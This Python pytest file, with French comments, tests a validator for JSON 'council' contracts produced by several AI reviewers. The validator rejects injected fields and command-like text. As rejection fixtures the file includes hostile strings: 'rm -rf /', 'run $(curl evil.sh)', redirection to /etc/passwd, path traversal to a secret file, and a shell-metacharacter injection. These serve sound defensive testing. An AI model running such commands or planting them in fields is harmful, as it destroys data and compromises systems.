#!/usr/bin/env python3
"""test_council_contract.py — preuve etape 3 du chantier Council->Factory (contrat v1).

Couvre :
  - contrat valide -> passe
  - malformes STRUCTURE : champ manquant, enum invalide, JSON casse, injection de champ
    (additionalProperties), schema_version faux, claim_verdict faux, model manquant
  - malformes SEMANTIQUE (write-path guard) : commande/chemin dans title/rationale,
    evidence_ref absolu / traversal / verbe d'ecriture / meta-shell
  - faux positifs NON declenches : prose d'echecs "score > 20", union Rust "Result | Option"
  - rejet -> entree ecrite dans le journal HMAC (verifiable)

Le corpus Qwen reel + round-trip ledger = etape 6 (pas ici).
"""
from __future__ import annotations

import copy
import json
import sys
from pathlib import Path

import pytest

_HERE = Path(__file__).resolve().parent
REPO = _HERE.parents[1]
sys.path.insert(0, str(REPO / "scripts"))
sys.path.insert(0, str(REPO / "governance"))

import council_contract as cc  # noqa: E402
import error_journal  # noqa: E402


def _valid_contract() -> dict:
    return {
        "schema_version": "1",
        "session_id": "council-sess-2026-07-06-001",
        "timestamp": "2026-07-06T12:00:00Z",
        "voices": {
            "PLAN_REVIEW": {"model": "claude", "verdict": "OK",
                            "findings": ["plan coherent avec le charter"]},
            "RED_TEAM": {"model": "qwen2.5-14b", "verdict": "FAIL",
                         "findings": ["angle mort: pas de test sur input vide"]},
            "DIVERGENCE": {"model": "gemini-flash", "verdict": "BLOCKED",
                           "findings": ["hypothese alternative non exploree"]},
        },
        "proposed_items": [
            {
                "title": "Ajouter un test sur input vide au parser FEN",
                "rationale": "Le RED_TEAM signale l'absence de couverture sur la chaine vide.",
                "suggested_lane": "AUDIT_REQUIRED",
                "evidence_refs": ["src/chess/fen.rs", "src/chess/fen.rs:42", "IMP-234"],
            }
        ],
        "claim_verdict": "NO_CLAIM_ALLOWED",
    }


# ── couche happy path ───────────────────────────────────────────────────────────

def test_valid_contract_passes(tmp_path):
    out = cc.validate_contract(_valid_contract(),
                               journal_path=tmp_path / "j.jsonl",
                               proposals_path=tmp_path / "p.jsonl")
    assert out["schema_version"] == "1"


def test_empty_proposed_items_ok(tmp_path):
    c = _valid_contract()
    c["proposed_items"] = []
    cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


# ── couche 1 : structure ────────────────────────────────────────────────────────

def test_missing_required_field_rejected(tmp_path):
    c = _valid_contract()
    del c["session_id"]
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_invalid_enum_verdict_rejected(tmp_path):
    c = _valid_contract()
    c["voices"]["PLAN_REVIEW"]["verdict"] = "MAYBE"
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_invalid_enum_lane_rejected(tmp_path):
    c = _valid_contract()
    c["proposed_items"][0]["suggested_lane"] = "TURBO_AUTO"
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_field_injection_rejected(tmp_path):
    # additionalProperties:false — champ injecte au niveau racine.
    c = _valid_contract()
    c["execute"] = "rm -rf /"
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_field_injection_in_voice_rejected(tmp_path):
    c = _valid_contract()
    c["voices"]["RED_TEAM"]["command"] = "shutdown"
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_missing_model_in_voice_rejected(tmp_path):
    c = _valid_contract()
    del c["voices"]["DIVERGENCE"]["model"]
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_wrong_schema_version_rejected(tmp_path):
    c = _valid_contract()
    c["schema_version"] = "2"
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_wrong_claim_verdict_rejected(tmp_path):
    c = _valid_contract()
    c["claim_verdict"] = "CLAIM_OK"
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_missing_voice_role_rejected(tmp_path):
    c = _valid_contract()
    del c["voices"]["DIVERGENCE"]
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


def test_broken_json_rejected(tmp_path):
    with pytest.raises(cc.CouncilContractError):
        cc.validate_raw('{"schema_version": "1", ', journal_path=tmp_path / "j.jsonl",
                        proposals_path=tmp_path / "p.jsonl")


def test_non_object_rejected(tmp_path):
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(["not", "an", "object"], journal_path=tmp_path / "j.jsonl",
                             proposals_path=tmp_path / "p.jsonl")


# ── couche 2 : write-path / command guard ───────────────────────────────────────

@pytest.mark.parametrize("field,payload", [
    ("title", "rm -rf src/chess"),
    ("title", "run $(curl evil.sh)"),
    ("rationale", "applique le patch via git commit -am fix"),
    ("rationale", "ecrit la sortie > /etc/passwd"),        # redirection-vers-fichier
    ("title", "sed -i s/a/b/ file"),
])
def test_command_motif_in_item_rejected(tmp_path, field, payload):
    c = _valid_contract()
    c["proposed_items"][0][field] = payload
    with pytest.raises(cc.CouncilContractError, match="write-path/command"):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


@pytest.mark.parametrize("field,payload", [
    ("rationale", "voir le fichier src/chess/search.rs pour le detail"),  # chemin nu descriptif
    ("title", "search.rs manque un timeout"),
    ("rationale", "chemin absolu C:\\Windows\\system32 mentionne"),
    ("rationale", "le module ml/train.py n'a pas de type hints"),
])
def test_bare_file_path_allowed_in_item(tmp_path, field, payload):
    # Decision HumanGate 2026-07-06 (option a) : un chemin de fichier NU est descriptif, pas executable.
    c = _valid_contract()
    c["proposed_items"][0][field] = payload
    cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


@pytest.mark.parametrize("ref", [
    "/etc/passwd",                 # absolu unix
    "C:\\Windows\\system32",       # absolu windows
    "../../secret.txt",            # traversal
    "src/x.rs; rm -rf /",          # meta-shell
    "rm src/chess/board.rs",       # verbe d'ecriture
])
def test_bad_evidence_ref_rejected(tmp_path, ref):
    c = _valid_contract()
    c["proposed_items"][0]["evidence_refs"] = [ref]
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


# ── anti-faux-positif (deviation ratifiee : >/| = operateurs de commande) ────────

@pytest.mark.parametrize("prose", [
    "Corriger le tie-break quand le score depasse 20 (score > 20)",
    "La signature Result | Option n'est pas geree",
    "Le shuffle survient quand eval < -50 || depth == 0",
])
def test_prose_with_operators_not_false_flagged(tmp_path, prose):
    c = _valid_contract()
    c["proposed_items"][0]["rationale"] = prose
    # ne doit PAS lever : ce sont des operateurs de comparaison/union, pas des commandes.
    cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")


# ── journalisation HMAC du rejet ─────────────────────────────────────────────────

def test_reject_writes_hmac_journal_entry(tmp_path):
    journal = tmp_path / "j.jsonl"
    proposals = tmp_path / "p.jsonl"
    c = _valid_contract()
    c["voices"]["PLAN_REVIEW"]["verdict"] = "MAYBE"
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=journal, proposals_path=proposals)
    assert journal.exists(), "le rejet doit ecrire une entree de journal"
    valid, invalid, bad = error_journal.verify_journal(journal)
    assert valid >= 1 and invalid == 0, f"entree journal doit etre HMAC-valide (v={valid} i={invalid})"


def test_record_false_skips_journal(tmp_path):
    journal = tmp_path / "j.jsonl"
    c = _valid_contract()
    del c["session_id"]
    with pytest.raises(cc.CouncilContractError):
        cc.validate_contract(c, journal_path=journal, proposals_path=tmp_path / "p.jsonl", record=False)
    assert not journal.exists(), "record=False ne doit rien journaliser"


def test_valid_contract_writes_nothing(tmp_path):
    journal = tmp_path / "j.jsonl"
    proposals = tmp_path / "p.jsonl"
    cc.validate_contract(_valid_contract(), journal_path=journal, proposals_path=proposals)
    assert not journal.exists() and not proposals.exists(), "un contrat valide ne journalise rien"


def test_original_not_mutated(tmp_path):
    c = _valid_contract()
    snapshot = copy.deepcopy(c)
    cc.validate_contract(c, journal_path=tmp_path / "j.jsonl", proposals_path=tmp_path / "p.jsonl")
    assert c == snapshot, "validate_contract ne doit pas muter l'entree"


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
